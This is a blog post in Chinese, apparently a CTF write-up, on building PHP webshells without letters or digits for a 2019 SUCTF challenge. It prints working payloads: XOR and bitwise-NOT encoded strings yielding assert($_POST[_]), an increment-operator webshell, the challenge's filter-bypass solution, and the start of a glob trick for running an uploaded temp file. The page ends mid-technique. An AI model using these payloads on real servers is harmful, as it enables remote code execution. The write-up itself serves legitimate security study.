@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言在整理2019SUCTF的赛题时，其中有一题代码审计，限制字符、字符串长度，让你构造一个webshell。 1234567891011121314151617181920212223242526272829303132333435363738&amp;lt;?phpfunction get_the_flag()&amp;#123;    // webadmin will remove your upload">
+<meta name="keywords" content="CTF,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP限制字符构造webshell">
+<meta property="og:url" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/index.html">
+<meta property="og:site_name" content="desperadoccy的小窝">
+<meta property="og:description" content="前言在整理2019SUCTF的赛题时，其中有一题代码审计，限制字符、字符串长度，让你构造一个webshell。 1234567891011121314151617181920212223242526272829303132333435363738&amp;lt;?phpfunction get_the_flag()&amp;#123;    // webadmin will remove your upload">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/1.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/2.jpg">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/3.jpg">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/4.jpg">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/5.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/6.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/7.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/9.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/8.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/10.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/11.png">
+<meta property="og:updated_time" content="2022-01-29T03:34:35.032Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP限制字符构造webshell">
+<meta name="twitter:description" content="前言在整理2019SUCTF的赛题时，其中有一题代码审计，限制字符、字符串长度，让你构造一个webshell。 1234567891011121314151617181920212223242526272829303132333435363738&amp;lt;?phpfunction get_the_flag()&amp;#123;    // webadmin will remove your upload">
+<meta name="twitter:image" content="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/">
+
+
+
+
+
+  <title>PHP限制字符构造webshell | desperadoccy的小窝</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">desperadoccy的小窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://desperadoccy.github.io/2019/10/08/PHP-no-letter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="desperadoccy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/favicon.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="desperadoccy的小窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP限制字符构造webshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T19:26:48+08:00">
+                2019-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在整理2019SUCTF的赛题时，其中有一题代码审计，限制字符、字符串长度，让你构造一个webshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!!</span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>自己太菜，根本想不到骚操作，一顿搜索、查看题解之后有了此篇总结。<br><a id="more"></a></p>
+<h2 id="webshell的构造"><a href="#webshell的构造" class="headerlink" title="webshell的构造"></a>webshell的构造</h2><p>抛开题目，我们先来想如果没有字母数字，我们该怎么构造webshell<br>单纯无字母数字构造webshell，不考虑长度的话，思路有两个</p>
+<pre><code>1. 利用位运算
+2. 利用自增运算符
+</code></pre><p>以如下代码为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。我们可以利用两个非字母非数字的进行异或操作来得到a-z0-8这些字符。<br>异或运算中<br>    a^b=c<br>    c^b=a<br>所以我们先将phpinfo分别与 <strong>`</strong> 进行异或操作<br>得到的结果(url编码表示)为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p ---- %10</span><br><span class="line">h ---- %08</span><br><span class="line">p ---- %10</span><br><span class="line">i ---- %09</span><br><span class="line">n ---- %0e</span><br><span class="line">f ---- %06</span><br><span class="line">o ---- %0f</span><br></pre></td></tr></table></figure>
+<p>构造payload<code>?shell=(&#39;%10%08%10%09%0e%06%0f&#39;^&#39;%60%60%60%60%60%60%60&#39;)();</code>得到shell</p>
+<p>p神的payload<code>?shell=(~%8F%97%8F%96%91%99%90)();</code></p>
+<p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，只有PHP7之后的版本中增加了对此的支持。</p>
+<p>所以我们需要改变一下函数调用（PHP5环境）</p>
+<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。assert函数类似于eval,上传的字符串会被当做PHP代码执行。<br>因此利用上面的方法我可以构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+<p>同时向服务器POST命令<br><img src="/2019/10/08/PHP-no-letter/1.png" alt="test"></p>
+<h3 id="思路二-Copy-P神"><a href="#思路二-Copy-P神" class="headerlink" title="思路二(Copy P神)"></a>思路二(Copy P神)</h3><p>先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.increment.php</a><br><img src="/2019/10/08/PHP-no-letter/2.jpg" alt="test"><br>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br><img src="/2019/10/08/PHP-no-letter/3.jpg" alt="test"><br>再取这个字符串的第一个字母，就可以获得’A’了。</p>
+<p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($<em>POST[</em>])，无需获取小写a）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+<p>执行结果：<br><img src="/2019/10/08/PHP-no-letter/4.jpg" alt="test"></p>
+<h3 id="陆老板的思路"><a href="#陆老板的思路" class="headerlink" title="陆老板的思路"></a>陆老板的思路</h3><p>在思路二中我们已经获取到了字母A，接下来我们尝试单纯用字母a，没有其他字母和数字能够构造webshell。<br>先来看PHP的特性(<code>php -a</code>命令调出控制台)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(a);</span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">Use</span> <span class="title">of</span> <span class="title">undefined</span> <span class="title">constant</span> <span class="title">a</span> - <span class="title">assumed</span> '<span class="title">a</span>' (<span class="title">this</span> <span class="title">will</span> <span class="title">throw</span> <span class="title">an</span> <span class="title">Error</span> <span class="title">in</span> <span class="title">a</span> <span class="title">future</span> <span class="title">version</span> <span class="title">of</span> <span class="title">PHP</span>) <span class="title">in</span> <span class="title">php</span> <span class="title">shell</span> <span class="title">code</span> <span class="title">on</span> <span class="title">line</span> 1</span><br><span class="line"><span class="title">string</span>(1) "<span class="title">a</span>"</span><br><span class="line"><span class="title">php</span> &gt; <span class="title">var_dump</span>(!<span class="title">a</span>);</span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">Use</span> <span class="title">of</span> <span class="title">undefined</span> <span class="title">constant</span> <span class="title">a</span> - <span class="title">assumed</span> '<span class="title">a</span>' (<span class="title">this</span> <span class="title">will</span> <span class="title">throw</span> <span class="title">an</span> <span class="title">Error</span> <span class="title">in</span> <span class="title">a</span> <span class="title">future</span> <span class="title">version</span> <span class="title">of</span> <span class="title">PHP</span>) <span class="title">in</span> <span class="title">php</span> <span class="title">shell</span> <span class="title">code</span> <span class="title">on</span> <span class="title">line</span> 1</span><br><span class="line"><span class="title">bool</span>(<span class="title">false</span>)</span><br><span class="line"><span class="title">php</span> &gt; <span class="title">var_dump</span>(@!<span class="title">a</span>);</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">php &gt; var_dump(@!!a);</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">php &gt; var_dump(@!!a+@!!a);</span><br><span class="line">int(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+<p>我们可以看到将字符a逻辑反(<code>!</code>)后，php就自动处理为bool类型<br>而对bool类型计算时，bool类型又会转为int类型<br>因此我们可以利用这一特性和chr函数来构造phpinfo<br>payload如下（payload需要url编码）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(AYAYYRY^trim(((((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a)))+(((!!a+!!a))**((!!a))))))();</span><br></pre></td></tr></table></figure>
+<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>回到最初的题目，构造shell类似<code>?_=$_POST[&#39;x&#39;]</code><br>其中后端过滤了一些字符，因此需要处理一下<br>将<code>_GET</code>取反，并选择一个为被过滤的字符用来传参</p>
+<blockquote>
+<p>%ff^<em> = ~</em><br>即</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();</span><br></pre></td></tr></table></figure>
+<p>查看phpinfo只要<code>&amp;%ff=phpinfo</code><br>这里为什么不适用POST，就是因为它对长度进行了限制，而恰巧GET是最大限度</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h4 id="多次异或"><a href="#多次异或" class="headerlink" title="多次异或"></a>多次异或</h4><p>有些题目不是对长度进行限制，而是对字符种类进行限制，这样字符种类过多的payload就不适用。我们可以通过多次位（异或）操作<code>a^b^c</code>来减小字符种类。</p>
+<h4 id="php5-shell构造webshell"><a href="#php5-shell构造webshell" class="headerlink" title="php5+shell构造webshell"></a>php5+shell构造webshell</h4><p>由于php5不支持($a)()特性，所以在过滤掉<code>$</code>字符时，我们需要另找方法构造。</p>
+<h5 id="构造文件-COPY-P神"><a href="#构造文件-COPY-P神" class="headerlink" title="构造文件(COPY P神)"></a>构造文件(COPY P神)</h5><p>p神提供了一个思路：利用shell打破禁锢<br>首先了解一下Linux shell的两个知识点</p>
+<ol>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+<p>.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。<br>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
+<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p>
+<p>第二个难题接踵而至，执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
+<ol>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符<br>那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。</li>
+</ol>
+<p>但我们尝试执行. /???/?????????，却得到如下错误：<br><img src="/2019/10/08/PHP-no-letter/5.png" alt="test"><br>这是因为，能够匹配上/???/?????????这个通配符的文件有很多，我们可以列出来：<br><img src="/2019/10/08/PHP-no-letter/6.png" alt="test"><br>可见，我们要执行的/tmp/phpcjggLC排在倒数第二位。然而，在执行第一个匹配上的文件（即/bin/run-parts）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
